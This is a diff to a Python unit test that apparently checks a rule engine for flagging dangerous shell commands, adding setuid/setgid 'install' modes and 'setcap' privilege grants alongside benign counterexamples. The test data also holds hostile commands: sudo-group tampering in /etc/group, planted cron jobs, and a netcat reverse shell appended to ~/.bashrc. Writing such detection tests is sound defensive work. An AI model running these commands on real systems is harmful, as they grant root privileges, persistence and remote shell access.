@@ -240,7 +240,17 @@ class CodingPack(unittest.TestCase):
             "echo 'sudo:x:27:dev' >> /etc/group", "echo 'sudo:!::dev' | tee -a /etc/gshadow",
             "cp group.new /etc/group")] + [(c, "TK-A077") for c in (
             "chmod 7755 x", "chmod 5755 x", "chmod 3755 x", "chmod 04755 x", "chmod u+sx x", "chmod +sx x",
-            "chmod g+s,u+x x", "chmod u=rwxs x", "chmod u-x+s x", "chmod -v -R u+s x")] + [(c, "TK-A011") for c in (
+            "chmod g+s,u+x x", "chmod u=rwxs x", "chmod u-x+s x", "chmod -v -R u+s x",
+            "install -m 4755 x /usr/local/bin/x", "install -m4755 x /usr/local/bin/x",
+            "install -m 02755 x /usr/local/bin/x", "install -Dm 4755 x /usr/local/bin/x",
+            "install -o root -g root -m 6755 x /usr/local/bin/x", "install --mode=4755 x /usr/local/bin/x",
+            "install --mode 04755 x /usr/local/bin/x", "install -m u+s x /usr/local/bin/x",
+            "install --mode=g+s,u+x x /usr/local/bin/x", "install -m u=rwxs x /usr/local/bin/x",
+            "/usr/bin/install -m 4755 x /usr/local/bin/x", "setcap cap_setuid+ep x", "setcap cap_setgid=ep x",
+            "setcap cap_sys_admin+eip x", "setcap CAP_SETUID+ep x",
+            "setcap -q -n 1000 cap_net_bind_service,cap_setuid+ep x", "setcap cap_setuid,cap_net_bind_service+ep x",
+            "setcap cap_net_bind_service+ep /a cap_sys_admin+p /b",
+            "/sbin/setcap cap_setuid+ep x")] + [(c, "TK-A011") for c in (
             "cp evil /var/spool/cron/crontabs/dev", "echo '* * * * * x' > /etc/cron.daily/x",
             "cp evil.sh /etc/cron.hourly/")] + [(c, "TK-A078") for c in (
             "echo 'nc 192.0.2.7 4444 -e /bin/sh' >> ~/.bashrc", "echo 'nc -nv 192.0.2.7 4444 -e /bin/sh' >> ~/.bashrc",
@@ -254,7 +264,13 @@ class CodingPack(unittest.TestCase):
         benign = ("chmod u-s x", "chmod 1777 x", "chmod 0755 x", "chmod -R go-w .", "gpasswd -d dev sudo",
                   "usermod -u 1001 dev", "usermod -c 'Greg G' dev", "cat /etc/group", "ls /var/spool/cron/crontabs",
                   "cat /etc/cron.daily/logrotate", "echo 'nc -zv localhost 80' >> notes.md",
-                  "echo 'alias ports=\"nc -zv localhost\"' >> ~/.zshrc")
+                  "echo 'alias ports=\"nc -zv localhost\"' >> ~/.zshrc",
+                  "install -m 755 x /usr/local/bin/x", "install -m 0755 x /usr/local/bin/x", "install -m 1777 x /tmp/x",
+                  "install --mode=0644 x /usr/local/share/x", "install -m u+x x /usr/local/bin/x",
+                  "install -m u-s x /usr/local/bin/x", "install -d /tmp/build", "install 4755 /tmp/dst",
+                  "setcap cap_net_bind_service+ep x", "setcap -r x", "setcap cap_setuid-ep x",
+                  "setcap cap_setuid,cap_net_bind_service-ep x", "setcap cap_setuid= x",
+                  "setcap -v cap_setuid+ep x", "setcap -q -v cap_setuid+ep x")
         new = {want for _, want in held}
         for pack, engine, e in self.every_pack():
             for command, want in held:
